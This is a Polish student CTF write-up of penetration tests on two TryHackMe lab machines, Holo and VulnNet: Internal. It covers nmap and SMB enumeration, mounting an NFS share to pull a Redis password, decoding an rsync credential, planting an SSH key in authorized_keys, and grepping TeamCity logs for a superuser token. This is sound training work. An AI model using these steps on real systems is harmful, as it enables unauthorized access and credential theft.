# Projek 3 z kursu Cybersecutryty w SDAcademy.
## Założenia projektu:

1. Dwie obowiązkowe maszyny na portalu e-lerning TryHackMe.com:
    * https://tryhackme.com/room/hololive
    * https://tryhackme.com/room/vulnnetinternal
2. Trzyosobowa grupa:
    
    [Justyna A.](https://github.com/Enwalme)

    [Jacek B.](https://github.com/Jacek1983)

    [Adrian G.](https://www.linkedin.com/in/adrian-gizi%C5%84ski-8999b2261/)
3. Stworzenie raportu z testów penetracyjnych owych maszyn.

## Maszyna [Holo:](https://tryhackme.com/room/hololive)

![:(](/screens/zrzut_THM_HOLO_front.bmp)

1. sprawdzam co mogę znaleźć za pomocą różnych narzedzi w sieci.

    wykorzystane narzędzia z poleceniami:
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# nmap -sV -sC -p- -v 10.200.111.0/24 (sugerowane wykorzystanie nmap w opisie)

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open 10.200.111.33

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# enum4linux 10.200x.111.33

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# enum4linux 10.200.111.250
```

2. Na lokalnym linux-ie tworze katalog Holo i przechodzę do niego. Kolejno tworzę plik, do którego będę zapisywać wszystkie dane. Następnie poleceniem ```cat``` i ```grep``` wyszukuję interesujące dane.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ mkdir Holo           
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ cd Holo                               
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─$ nano
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─$ cat nmap_10.200.x.0_task8.txt | grep open
```
![:(](/screens/task8_grep_open.png)
![:(](/screens/task8_grep_http.png)

* W ten sposób dosyć szybko rozwiązałem Task8

![:(](/screens/task8_odp.bmp)

Następnie zgodnie z zaleceniem wykonuję enumerację za pomocą ```GoBuster ``` i ```Wfuzz  ``` również z [GitHab-a](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-110000.txt) pobieram sugerowaną listę. 

```  
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─# gobuster vhost -u http://www.holo.live/ -w list_task9.txt 

┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
    
gobuster vhost -u http://ip-10-200-111-33.eu-west-1.compute.internal:80/ -wlist_task9.txt
```


## Maszyna [VulnNet: Internal:](https://tryhackme.com/room/vulnnetinternal)
![Ups...](/screens/v_wstep.jpg)

    UWAGA: 
    Adresy IP maszyny atakowanej będą się różnić na zrzutach ekranu gdyż 
    było tworzone podczas krótkich sesji a nie pojedyńczego rozwiązania tego pokoju.

1. Na początek zaczynam od użycia narzędzia nmap.

```
┌──(root㉿kali)-[~]
└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA 10.10.238.20_nmap <IP_atakowanej_masz>
```
Z zapisanego pliku z nmap-a ```gerp-uje``` otwarte porty.

![:(](/screens/VulnNet__nmap_grep_open.jpg)

Dalszą obserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``` sprawdzam co tam się znajduję.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ enum4linux -a <IP_atakowanej_masz> 
```
![;(](/screens/v_enum4linux.gif)

Za pomocą ```enum4linux``` znalazłem również użytkownika ```sys-internal```

2. Za pomocą polecenia ```smbclient``` sprawdzam i pobieram wszystkie zasoby z katalogu ```//IP_maszyny/shares```.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ smbclient -N //<IP_atakowanej_masz>/shares

smb: \> ls

smb: \> cd /temp/

smb: \temp\> get services.txt
```



![:(](/screens/v_smbclient_flag.gif)

Po przejrzeniu pobranych plików znalazłem pierwszą flagę.

3. Kolejno skupiam się na usłudze NFS na porcie 2049.

    NFS to system typu klient/serwer, który umożliwia użytkownikom dostęp do plików przez sieć i traktowanie ich tak, jakby znajdowały się w lokalnym katalogu plików.

za pomocą polecenia ```mkdir``` tworzę katalog, do którego zamontuję udostępnione przez NFS katalogi.
Następnie pobieram i przeglądam wszystkie dane. Zwracam uwagę na plik ```redis.conf```, w nim znajduę klucz do usługi ```Redis```.

```
┌──(kali㉿kali)-[~]
└─$ mkdir /tmp/mount  
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs <IP_atakowanej_masz>: /tmp/mount/ -nolock
[sudo] password for kali: 
                                                                                 
┌──(kali㉿kali)-[~]
└─$ ls -ls /tmp/mount
total 4
4 drwxr-xr-x 4 root root 4096 Feb  2  2021 opt
                                                                                 
┌──(kali㉿kali)-[~]
└─$ cd /tmp/mount                                      
                                                                                 
┌──(kali㉿kali)-[/tmp/mount]
└─$ ls               
opt
                                                                                 
┌──(kali㉿kali)-[/tmp/mount]
└─$ cd opt       
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ ls
conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ sl -la                                             
sl: command not found
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ ls -la                                  
total 12
drwxr-xr-x  4 root root 4096 Feb  2  2021 .
drwxr-xr-x 24 root root 4096 Feb  6  2021 ..
drwxr-xr-x  9 root root 4096 Feb  2  2021 conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ cd conf 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la
total 36
drwxr-xr-x 9 root root 4096 Feb  2  2021 .
drwxr-xr-x 4 root root 4096 Feb  2  2021 ..
drwxr-xr-x 2 root root 4096 Feb  2  2021 hp
drwxr-xr-x 2 root root 4096 Feb  2  2021 init
drwxr-xr-x 2 root root 4096 Feb  2  2021 opt
drwxr-xr-x 2 root root 4096 Feb  2  2021 profile.d
drwxr-xr-x 2 root root 4096 Feb  2  2021 redis
drwxr-xr-x 2 root root 4096 Feb  2  2021 vim
drwxr-xr-x 2 root root 4096 Feb  2  2021 wildmidi
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls    
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la hp
total 12
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  961 Feb  2  2021 hplip.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp hp/hplip.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la init 
total 20
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  278 Feb  2  2021 anacron.conf
-rw-r--r-- 1 root root 1444 Feb  2  2021 lightdm.conf
-rw-r--r-- 1 root root  453 Feb  2  2021 whoopsie.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/anacron.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/lightdm.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/whoopsie.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la opt       
total 8
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la profile.d 
total 24
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  664 Feb  2  2021 bash_completion.sh
-rw-r--r-- 1 root root 1003 Feb  2  2021 cedilla-portuguese.sh
-rw-r--r-- 1 root root  652 Feb  2  2021 input-method-config.sh
-rw-r--r-- 1 root root 1941 Feb  2  2021 vte-2.91.sh
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/bash_completion.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/cedilla-portuguese.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/input-method-config.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/vte-2.91.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la redis    
total 68
drwxr-xr-x 2 root root  4096 Feb  2  2021 .
drwxr-xr-x 9 root root  4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 58922 Feb  2  2021 redis.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp redis/redis.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la vim                                             
total 16
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 2469 Feb  2  2021 vimrc
-rw-r--r-- 1 root root  662 Feb  2  2021 vimrc.tiny
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp vim/vimrc ~/Desktop/TryHackMe/VulnNe_Internal
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp vim/vimrc.tiny ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la wildmidi                                      
total 16
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 4542 Feb  2  2021 wildmidi.cfg
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp wildmidi/wildmidi.cfg ~/Desktop/TryHackMe/VulnNe_Internal 

___________________________________________________

┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ cat redis.conf 
...
################################# REPLICATION #################################
...
requirepass "B65Hx562F@ggAZ@F"
...

```

4. Instaluję ```redis``` i łaczę się z maszyną za pomocą usługi. Przeglądam i pobieram wszystklie dane. W plikach ```internal flag``` i ```authlist``` znajduję flagę i hash-a. 

```
┌──(root㉿kali)-[~]
└─# sudo apt-get install redis-tools
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ redis-cli -h <IP_atakowanej_masz> -a "B65Hx562F@ggAZ@F"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.161.43:6379> KEYS *
1) "tmp"
2) "internal flag"
3) "int"
4) "marketlist"
5) "authlist"

10.10.161.43:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.161.43:6379> get "tmp"
"temp dir..."
10.10.161.43:6379> get "temp dir..."
(nil)
10.10.161.43:6379> get "int"
"10 20 30 40 50"
10.10.161.43:6379> get "authilist"
(nil)
10.10.161.43:6379> LRANGE "authlist" 0 999
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```
![:(](/screens/v_redis_2_flag%26hash.bmp)

Znalezionego HASH-a sprawdzam za pomocą [hashes.com](https://hashes.com/en/tools/hash_identifier).
Uzyskuję możliwość logowania za pomocą ```rsync```.

    QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== - Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v - Possible algorithms: Base64 Encoded String
![:(](/screens/v_hashes.png)

4. Rsync - po zalogowaniu się okazało się, że możemy zobaczyć plik txt z kolejną flagą ale nie miałem pomysłu jak mogę go pobrać lub otworzyć. W rozwiązaniu tego plroblemu bardzo pomocny okazał się [ChatGPT](https://chat.openai.com/chat). Pobrałem całą zawartość do której dawał mi dostęp ```rsync```. Po pobraniu katalogu ```files``` za pomocą polecenia ```sudo chmod -R 777 sys-internal``` zmieniłem uprawnienia dla wszystkich plików. W ten sposób zdobyłem kolejną flage.

![UPs...](/screens/v_pytanie_chatgpt_o_pobieranie_przez_rsync.gif)
```
Ja:
jak za pomocą polecenia rsync pobrać katalog?

ChatGPT:
Aby pobrać katalog za pomocą polecenia rsync, wykonaj następujące kroki:

Otwórz terminal lub konsolę.

Wpisz polecenie rsync, a następnie podaj lokalizację źródłową i docelową. Na przykład, jeśli chcesz pobrać katalog o nazwie "folder" z serwera zdalnego do bieżącego katalogu lokalnego, wpisz:
```
```
rsync -avz username@remote_host:/path/to/folder/ .
```
```
W powyższym poleceniu:
-a oznacza tryb archiwum, co oznacza, że ​​rsync będzie zachowywał właściwości plików, takie jak uprawnienia, daty itp.
-v oznacza tryb verbose, co oznacza, że ​​rsync będzie wyświetlał szczegółowe informacje o operacji kopiowania.
-z oznacza tryb kompresji, co oznacza, że ​​rsync będzie kompresował dane przed ich przesłaniem, co może zmniejszyć czas transferu danych.
Zastąp "username" nazwą użytkownika na serwerze zdalnym i "remote_host" adresem IP lub nazwą hosta serwera zdalnego.

Zastąp "/path/to/folder/" ścieżką do katalogu na serwerze zdalnym, który chcesz pobrać.

Znak "." na końcu oznacza bieżący katalog lokalny jako miejsce docelowe, gdzie zostanie pobrany katalog.

Wpisz hasło, jeśli zostaniesz o to poproszony, aby potwierdzić swoją tożsamość na serwerze zdalnym.

Po wykonaniu powyższych kroków, rsync pobierze katalog z serwera zdalnego do bieżącego katalogu lokalnego.

```
```                              
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ rsync --list-only rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal
Password: 
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ rsync --list-only rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 07:49:29 .
-rw-------             61 2021/02/06 07:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
-rw-r--r--            807 2021/02/01 07:51:14 .profile
lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 06:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
drwx------          4,096 2021/02/01 07:53:19 .dbus
drwx------          4,096 2021/02/01 07:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
drwx------          4,096 2021/02/01 08:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
drwx------          4,096 2021/02/02 06:16:16 .thumbnails
drwx------          4,096 2021/02/01 07:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos

rsync -r rsync://rsync-connect@<IP_atakowanej_masz>/files/ ./rsync
```
Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatny zmieniam nazwę klucza publicznego za pomocą polecenia ```cp id-rsa.pub auhorized_keys```
Nastepnie kopiuję klucz publiczny poleceniem:
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ rsync -r authorized_keys rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
```

Podobnie robię z aplikacją ```LinEnum```, którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) na własną maszynę poleceniem:
```
git clone https://github.com/rebootuser/LinEnum.git
```
Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport, który pobieram w celu analizy.
[](/screens/v_LinEnum_raport.png)
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ cat raportLinEnum.txt | grep -A100 -i services | grep root
root         1  0.0  0.3 159568  7664 ?        Ss   10:55   0:01 /sbin/init splash
root         2  0.0  0.0      0     0 ?        S    10:55   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   10:55   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   10:55   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    10:55   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    10:55   0:01 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    10:55   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    10:55   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    10:55   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    10:55   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    10:55   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   10:55   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    10:55   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    10:55   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    10:55   0:00 [xenbus]
root        18  0.0  0.0      0     0 ?        S    10:55   0:00 [xenwatch]
root        19  0.0  0.0      0     0 ?        I    10:55   0:00 [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    10:55   0:00 [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    10:55   0:00 [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   10:55   0:00 [writeback]
root        23  0.0  0.0      0     0 ?        S    10:55   0:00 [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   10:55   0:00 [ksmd]
root        25  0.0  0.0      0     0 ?        SN   10:55   0:00 [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   10:55   0:00 [crypto]
root        27  0.0  0.0      0     0 ?        I<   10:55   0:00 [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   10:55   0:00 [kblockd]
root        29  0.0  0.0      0     0 ?        I<   10:55   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   10:55   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   10:55   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   10:55   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   10:55   0:00 [watchdogd]
root        36  0.0  0.0      0     0 ?        S    10:55   0:01 [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   10:55   0:00 [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    10:55   0:00 [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   10:55   0:00 [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   10:55   0:00 [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    10:55   0:00 [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   10:55   0:00 [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    10:55   0:00 [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   10:55   0:00 [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   10:55   0:00 [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   10:55   0:00 [kstrp]
root       117  0.0  0.0      0     0 ?        I<   10:55   0:00 [charger_manager]
root       177  0.0  0.0      0     0 ?        I    10:55   0:00 [kworker/0:2]
root       178  0.0  0.0      0     0 ?        I<   10:55   0:00 [ttm_swap]
root       198  0.0  0.0      0     0 ?        S    10:55   0:00 [jbd2/xvda1-8]
root       199  0.0  0.0      0     0 ?        I<   10:55   0:00 [ext4-rsv-conver]
root       225  0.0  0.0      0     0 ?        I<   10:56   0:00 [kworker/0:1H]
root       237  0.0  0.6  94788 12628 ?        S<s  10:56   0:00 /lib/systemd/systemd-journald
root       255  0.0  0.0      0     0 ?        I<   10:56   0:00 [rpciod]
root       256  0.0  0.0      0     0 ?        I<   10:56   0:00 [xprtiod]
root       258  0.0  0.0  23920   176 ?        Ss   10:56   0:00 /usr/sbin/blkmapd
root       263  0.0  0.2  47808  5592 ?        Ss   10:56   0:00 /lib/systemd/systemd-udevd
root       315  0.0  0.0  23748   196 ?        Ss   10:56   0:00 /usr/sbin/rpc.idmapd
root       337  0.0  0.1  47600  2788 ?        Ss   10:56   0:00 /sbin/rpcbind -f -w
root       361  0.0  0.2 427260  5116 ?        Ssl  10:56   0:00 /usr/sbin/ModemManager
root       365  0.0  0.2  70580  5124 ?        Ss   10:56   0:00 /lib/systemd/systemd-logind
root       366  0.0  0.0   4552   728 ?        Ss   10:56   0:00 /usr/sbin/acpid
root       367  0.0  0.1  14252  2324 ?        Ss   10:56   0:00 /usr/bin/rsync --daemon --no-detach
root       370  0.0  0.2 287624  5404 ?        Ssl  10:56   0:00 /usr/lib/accountsservice/accounts-daemon
root       372  0.0  0.2 473240  6000 ?        Ssl  10:56   0:00 /usr/lib/udisks2/udisksd
avahi      388  0.0  0.0  47076   340 ?        S    10:56   0:00 avahi-daemon: chroot helper
root       486  0.0  0.1  31320  2688 ?        Ss   10:56   0:00 /usr/sbin/cron -f
root       487  0.0  0.1  45224  3692 ?        Ss   10:56   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       491  0.0  0.7 170376 14580 ?        Ssl  10:56   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher
root       492  0.0  0.4 406680  9884 ?        Ssl  10:56   0:00 /usr/sbin/NetworkManager --no-daemon
root       494  0.0  0.2 100572  5000 ?        Ss   10:56   0:00 /usr/sbin/cupsd -l
root       496  0.0  0.3 292908  7164 ?        Ssl  10:56   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       521  0.0  0.0  38068   748 ?        Ss   10:56   0:00 /usr/sbin/rpc.mountd --manage-gids
root       530  0.0  0.0      0     0 ?        S    10:56   0:00 [lockd]
root       533  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       534  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       535  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       536  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       537  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       538  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       539  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       540  0.0  0.0      0     0 ?        S    10:56   0:00 [nfsd]
root       554  0.0  0.2 364220  5284 ?        Ssl  10:56   0:00 /usr/sbin/lightdm
root       561  0.0  0.0   4628   872 ?        S    10:56   0:00 sh teamcity-server.sh _start_internal
root       573  0.0  0.0   4752  1824 ?        S    10:56   0:00 sh /TeamCity/bin/teamcity-server-restarter.sh run
root       583  0.0  0.2  72296  5548 ?        Ss   10:56   0:00 /usr/sbin/sshd -D
root       585  0.0  0.5 265348 10428 ?        Ss   10:56   0:00 /usr/sbin/nmbd --foreground --no-process-group
root       590  0.0  0.6 646172 12236 ?        Ssl  10:56   0:00 /usr/bin/amazon-ssm-agent
root       613  0.0  0.0  15956  1924 ttyS0    Ss+  10:56   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       614  0.0  1.1 332956 23480 tty7     Ssl+ 10:56   0:00 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       615  0.0  0.0  16180  1788 tty1     Ss+  10:56   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       634  0.0  0.6 356692 13260 ?        Ss   10:56   0:00 /usr/sbin/smbd --foreground --no-process-group
```
![ZZZzzz...](/screens/v_rapport_linenum.png)

5. Po przejrzeniu raportu zaczyna interesować mnie usługa ```TimeCity```. Szperając po katalogach trafiam na katalog ```TimeCity``` i przyglądam mu się dokładniej.
```
TeamCity to narzędzie które wspiera budowanie i wdrażanie różnego rodzaju projektów. Po instalacji dostęp do internetowego interfejsu użytkownika TeamCity można uzyskać za pośrednictwem przeglądarki internetowej.
```
![ups!!!](/screens/v_katalog_TC.png)
Sprawdzenie gniazd sieciowych ujawnia, że ​​usługa jest uruchomiona dla hosta lokalnego na porcie 8111, który jest prawdopodobnie używany przez TeamCity. Sprawdziłem to poleceniem:
```
sys-internal@vulnnet-internal:/TeamCity$ ss -ltp
State              Recv-Q              Send-Q                                   Local Address:Port                                     Peer Address:Port              
LISTEN             0                   64                                             0.0.0.0:44113                                         0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:34737                                         0.0.0.0:*                 
LISTEN             0                   128                                      127.0.0.53%lo:domain                                        0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:ssh                                           0.0.0.0:*                 
LISTEN             0                   5                                            127.0.0.1:ipp                                           0.0.0.0:*                 
LISTEN             0                   50                                             0.0.0.0:microsoft-ds                                  0.0.0.0:*                 
LISTEN             0                   64                                             0.0.0.0:nfs                                           0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:57409                                         0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:38917                                         0.0.0.0:*                 
LISTEN             0                   5                                              0.0.0.0:rsync                                         0.0.0.0:*                 
LISTEN             0                   50                                             0.0.0.0:netbios-ssn                                   0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:6379                                          0.0.0.0:*                 
LISTEN             0                   128                                            0.0.0.0:sunrpc                                        0.0.0.0:*                 
LISTEN             0                   64                                                [::]:40625                                            [::]:*                 
LISTEN             0                   128                                               [::]:ssh                                              [::]:*                 
LISTEN             0                   5                                                [::1]:ipp                                              [::]:*                 
LISTEN             0                   50                                  [::ffff:127.0.0.1]:59513                                               *:*                 
LISTEN             0                   50                                                [::]:microsoft-ds                                     [::]:*                 
LISTEN             0                   64                                                [::]:nfs                                              [::]:*                 
LISTEN             0                   50                                                   *:9090                                                *:*                 
LISTEN             0                   128                                               [::]:43813                                            [::]:*                 
LISTEN             0                   1                                   [::ffff:127.0.0.1]:8105                                                *:*                 
LISTEN             0                   128                                               [::]:39337                                            [::]:*                 
LISTEN             0                   5                                                 [::]:rsync                                            [::]:*                 
LISTEN             0                   128                                              [::1]:6379                                             [::]:*                 
LISTEN             0                   50                                                [::]:netbios-ssn                                      [::]:*                 
LISTEN             0                   50                                                   *:39309                                               *:*                 
LISTEN             0                   100                                 [::ffff:127.0.0.1]:8111                                                *:*                 
LISTEN             0                   128                                               [::]:54127                                            [::]:*                 
LISTEN             0                   128                                               [::]:sunrpc                                           [::]:*                 
```
Token do logowania do TeamCity znalazłem za pomocą polecenia:

```
sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6178050210894872888 (use empty username with the token as the password to access the server)

```
![...](/screens/v_token_tc.png)


    Uwaga: ten token będzie dla Ciebie inny i zmienia się przy każdym ponownym uruchomieniu komputera.


